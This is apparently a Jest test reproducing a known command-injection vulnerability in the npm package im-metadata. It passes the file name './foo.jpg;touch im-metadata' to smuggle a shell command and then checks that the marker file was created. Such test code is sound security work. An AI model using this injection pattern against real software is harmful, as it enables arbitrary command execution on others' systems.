//https://snyk.io/vuln/SNYK-JS-IMMETADATA-544184
test("Command Injection in im-metadata", () => {
  const metadata = require("im-metadata");
  const fs = require("fs");
  const path = "./im-metadata";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  metadata("./foo.jpg;touch im-metadata", { exif: true }, function (
    error,
    metadata
  ) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
